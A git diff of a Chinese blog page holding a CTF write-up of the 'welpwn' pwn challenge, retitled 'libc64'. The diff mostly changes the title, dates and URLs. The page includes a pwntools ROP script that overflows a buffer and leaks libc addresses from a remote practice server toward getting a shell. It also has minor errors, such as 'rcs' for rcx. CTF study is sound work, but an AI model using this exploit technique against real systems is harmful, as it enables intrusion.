@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="shellcode等">
+    <meta name="keywords" content="libc64, shellcode等">
     <meta name="description" content="攻防世界welpwnchecksec
 ![屏幕截图 2025-01-16 114726](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114726.png)
 NX保护开启
@@ -20,7 +20,7 @@ IDA6">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>pwn</title>
+    <title>libc64 | pwn</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -339,12 +339,12 @@ IDA6">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">libc64</h1>
                 </div>
             </div>
         </div>
@@ -380,7 +380,7 @@ IDA6">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-01-17
+                    2025-01-18
                 </div>
                 
 
@@ -394,7 +394,7 @@ IDA6">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    595
+                    635
                 </div>
                 
 
@@ -429,7 +429,7 @@ IDA6">
 <p>F12查看![屏幕截图 2025-01-16 114953](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 114953.png)</p>
 <p>没有发现system和/bin/sh，可以通过泄漏puts或read函数真实地址，构造getshell。</p>
 <p>![屏幕截图 2025-01-16 175133](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 175133.png)</p>
-<p>需要构造两个payload，而且要先pop四次，payload1=’a’*0x18+p64(pop_4)+p64(ROP);</p>
+<p>64位Linux前六个参数是使用rdi,rsi,rdx,rcs,r8,r9传递的，需要构造两个payload，而且要先pop四次，payload1=’a’*0x18+p64(pop_4)+p64(ROP);</p>
 <p>![屏幕截图 2025-01-16 162420](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 162420.png)</p>
 <p>通过泄露puts和read真实地址寻找libc版本，脚本如下：</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os = 'linux', arch = 'amd64', log_level = 'debug')</span><br><span class="line"></span><br><span class="line">r = remote('61.147.171.105',63071)</span><br><span class="line">elf = ELF('./7eff')</span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt['puts']</span><br><span class="line">puts_got = elf.got['read']</span><br><span class="line">main_addr = elf.symbols['main']</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x4008a3</span><br><span class="line">pop_4 = 0x40089c</span><br><span class="line"></span><br><span class="line">payload = b'a' * (0x18) + p64(pop_4) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter('RCTF\n',payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))</span><br><span class="line"></span><br><span class="line">print("puts_real_addr:",hex(puts_real_addr))</span><br></pre></td></tr></tbody></table></figure>
@@ -441,6 +441,7 @@ IDA6">
 
 
 
+<p>![屏幕截图 2025-01-16 171231](C:\Users\33942\Pictures\Screenshots\屏幕截图 2025-01-16 171231.png)</p>
 
                 
             </div>
@@ -467,7 +468,7 @@ IDA6">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://ljq921.github.io/2025/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwelpwn/">https://ljq921.github.io/2025/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwelpwn/</a>
+                    <a href="https://ljq921.github.io/2025/01/18/libc64/">https://ljq921.github.io/2025/01/18/libc64/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -586,13 +587,13 @@ IDA6">
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2025/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwelpwn/">
+                <a href="/2025/01/18/libc64/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="libc64">
                         
-                        <span class="card-title"></span>
+                        <span class="card-title">libc64</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -603,7 +604,7 @@ IDA6">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-17
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-18
                             </span>
                         <span class="publish-author">
                             
